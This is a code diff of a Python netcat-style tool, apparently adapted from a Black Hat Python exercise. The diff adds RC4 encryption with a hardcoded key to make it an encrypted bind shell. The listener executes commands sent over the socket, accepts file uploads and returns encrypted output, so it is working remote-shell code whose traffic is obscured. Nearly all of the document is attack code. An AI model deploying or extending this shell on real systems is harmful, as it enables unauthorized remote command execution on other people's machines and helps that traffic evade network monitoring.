@@ -1,6 +1,3 @@
-#!/user/bin/env python3
-# -*- coding:utf-8 -*-
-
 import argparse
 import socket
 import shlex
@@ -8,7 +5,12 @@ import subprocess
 import sys
 import textwrap
 import threading
+from Crypto.Cipher import ARC4
 
+
+"""
+rc4,正向shell
+"""
 
 class PyNC:
     """
@@ -19,6 +21,7 @@ class PyNC:
         self.buffer = buffer
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.key = '123'
 
     def run(self):
         if self.args.listen:
@@ -38,7 +41,8 @@ class PyNC:
     def handle(self, client_socket):
         if self.args.execute:
             output = execute(self.args.execute)
-            client_socket.send(output.encode())
+            client_socket.send(rc4(output.encode(), self.key))
+            #client_socket.send(output.encode())
         elif self.args.upload:
             file_buffer = b''
             while True:
@@ -50,50 +54,49 @@ class PyNC:
             with open(self.args.upload, 'wb') as f:
                 f.write(file_buffer)
             message = f'Save file {self.args.upload}'
-            client_socket.send(message.encode())
+            # client_socket.send(message.encode())
+            client_socket.send(rc4(message.encode(), self.key))
         elif self.args.command:
-
-            try:
-                while True:
-                    recv_len = 1
-                    response = ''
-                    while recv_len:
-                        data = client_socket.recv(4096)
-                        recv_len = len(data)
-                        response = response + data.decode()
-                        if recv_len < 4096:
-                            break
+            cmd_buffer = b''
+            while True:
+                try:
+                    client_socket.send(rc4(b'BHP: #>', self.key))
+                    while '\n' not in cmd_buffer.decode():
+                        cmd_buffer += rc4_dec(client_socket.recv(1024), self.key)
+                    response = execute(cmd_buffer.decode())
                     if response:
-                        print(response)
-                        buffer = input('BHP: #>')
-                        buffer += '\n'
-                        client_socket.send(buffer.encode(encoding='utf-8'))
-            except KeyboardInterrupt:
-                print("User terminated.")
-                client_socket.close()
-                sys.exit()
+                        client_socket.send(rc4(response.encode(), self.key))
+                    cmd_buffer = b''
+
+                except Exception as e:
+                    print(f'Server killed {e}')
+                    self.socket.close()
+                    sys.exit()
 
     def send(self):
         self.socket.connect((self.args.target, self.args.port))
         print(f'Connecting:{self.args.target}:{self.args.port}')
         if self.buffer:
-            self.socket.send(self.buffer)
-        cmd_buffer = b''
-        while True:
-            try:
-                self.socket.send(b'BHP: #>')
-                while '\n' not in cmd_buffer.decode():
-                    cmd_buffer += self.socket.recv(1024)
-                response = execute(cmd_buffer.decode())
+            self.socket.send(rc4(self.buffer, self.key))
+        try:
+            while True:
+                recv_len = 1
+                response = ''
+                while recv_len:
+                    data = rc4_dec(self.socket.recv(4096), self.key)
+                    recv_len = len(data)
+                    response = response + data.decode()
+                    if recv_len < 4096:
+                        break
                 if response:
-                    self.socket.send(response.encode(encoding='utf-8'))
-                cmd_buffer = b''
-
-            except Exception as e:
-                print(f'Server killed {e}')
-                self.socket.send(str(e).encode(encoding='utf-8'))
-                break
-                # sys.exit()
+                    print(response)
+                    buffer = input('>')
+                    buffer += '\n'
+                    self.socket.send(rc4(buffer.encode(), self.key))
+        except KeyboardInterrupt:
+            print("User terminated.")
+            self.socket.close()
+            sys.exit()
 
 
 def execute(cmd):
@@ -104,6 +107,24 @@ def execute(cmd):
     # subprocess.checkout:附带参数运行命令并返回其输出
     output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
     return output.decode()
+
+
+def rc4(byttes, key):
+    key = bytes(key, encoding='utf-8')
+
+    enc = ARC4.new(key)
+    res = enc.encrypt(byttes)
+
+    return res
+
+
+def rc4_dec(byttes, key):
+    key = bytes(key, encoding='utf-8')
+
+    dec = ARC4.new(key)
+    res = dec.decrypt(byttes)
+
+    return res
 
 
 if __name__ == '__main__':
